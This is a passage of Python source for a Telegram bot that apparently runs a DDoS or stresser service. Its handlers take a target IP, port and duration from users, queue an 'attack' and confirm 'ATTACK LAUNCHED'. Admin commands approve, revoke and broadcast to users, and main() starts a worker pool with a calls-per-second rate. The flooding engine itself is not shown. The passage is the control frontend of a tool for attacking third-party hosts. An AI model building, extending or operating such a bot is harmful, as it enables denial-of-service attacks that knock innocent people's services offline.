    elif expecting == "attack_dur":
        try:
            d = int(text)
            if not (MIN_DURATION <= d <= MAX_DURATION):
                raise ValueError
        except ValueError:
            await update.message.reply_text(
                f"❌ Send duration {MIN_DURATION}-{MAX_DURATION}")
            return

        ip = ctx.user_data.pop("attack_ip", None)
        port = ctx.user_data.pop("attack_port", None)
        ctx.user_data.pop("expecting", None)
        ctx.user_data.pop("attack_mode", None)

        username = update.effective_user.first_name or "User"

        result = queue_attack(uid, username, ip, port, d)

        if result["status"] == "success":
            await update.message.reply_text(
                f"🚀 *ATTACK LAUNCHED!*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🎯 Target: `{result['target']}`\n"
                f"⏱️ Duration: `{result['duration']}s`\n"
                f"⚙️ Pool: `{result['pool_ready']}`\n"
                f"🆔 ID: `{result['attack_id']}`\n\n"
                f"_Attack running..._",
                parse_mode="Markdown",
                reply_markup=main_menu_kb(uid))
        else:
            await update.message.reply_text(
                f"❌ *FAILED*\n\n{result['message']}",
                parse_mode="Markdown",
                reply_markup=main_menu_kb(uid))

    # ===== ADMIN: approve =====
    elif expecting == "approve_user" and is_owner(uid):
        parts = text.split(maxsplit=1)
        try:
            target_id = int(parts[0])
        except (ValueError, IndexError):
            await update.message.reply_text("❌ Send: `<user_id> <name>`",
                                             parse_mode="Markdown")
            return
        name = parts[1] if len(parts) > 1 else f"User{target_id}"
        approve_user(target_id, name)
        ctx.user_data.pop("expecting", None)

        await update.message.reply_text(
            f"✅ Approved `{target_id}` ({name})",
            parse_mode="Markdown",
            reply_markup=admin_menu_kb())

        try:
            await ctx.bot.send_message(
                target_id,
                f"✅ *Approved!*\n\nSend /start",
                parse_mode="Markdown")
        except Exception:
            pass

    # ===== ADMIN: revoke =====
    elif expecting == "revoke_user" and is_owner(uid):
        try:
            target_id = int(text)
        except ValueError:
            await update.message.reply_text("❌ Invalid ID")
            return
        if target_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot revoke owner")
            return
        revoke_user(target_id)
        ctx.user_data.pop("expecting", None)
        await update.message.reply_text(
            f"✅ Revoked `{target_id}`",
            parse_mode="Markdown",
            reply_markup=admin_menu_kb())

    # ===== ADMIN: broadcast =====
    elif expecting == "broadcast" and is_owner(uid):
        ctx.user_data.pop("expecting", None)
        await do_broadcast(update, ctx, text)


# ============================================================
#  ▶️ MAIN
# ============================================================
def main():
    print("=" * 60)
    print(f"  {API_NAME}")
    print("=" * 60)

    load_all()
    load_sessions()

    print(f"👑 Owner:         {OWNER_ID}")
    print(f"👥 Approved:      {len(approved_users)}")
    print(f"🌐 Sessions:      {len(sessions)}")
    print(f"🎯 Max Workers:   {MAX_PRELOADED}")
    print(f"⚡ CPS/Worker:    {int(1/SPAM_SLEEP)}")
    print("=" * 60)

    # Start pool
    threading.Thread(target=pool_manager, daemon=True).start()
    print("🔄 Pool manager started")

    # Build bot
    bot = Application.builder().token(BOT_TOKEN).build()

    # Commands
    bot.add_handler(CommandHandler("start", cmd_start))
    bot.add_handler(CommandHandler("help", cmd_help))
    bot.add_handler(CommandHandler("status", cmd_status))
    bot.add_handler(CommandHandler("attack", cmd_attack))
    bot.add_handler(CommandHandler("tokens", cmd_tokens))
    bot.add_handler(CommandHandler("history", cmd_history))
    bot.add_handler(CommandHandler("approve", cmd_approve))
    bot.add_handler(CommandHandler("revoke", cmd_revoke))
    bot.add_handler(CommandHandler("users", cmd_users))
    bot.add_handler(CommandHandler("broadcast", cmd_broadcast))

    # Callbacks
    bot.add_handler(CallbackQueryHandler(on_button))

    # Text
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print("🤖 Bot starting polling...")
    bot.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()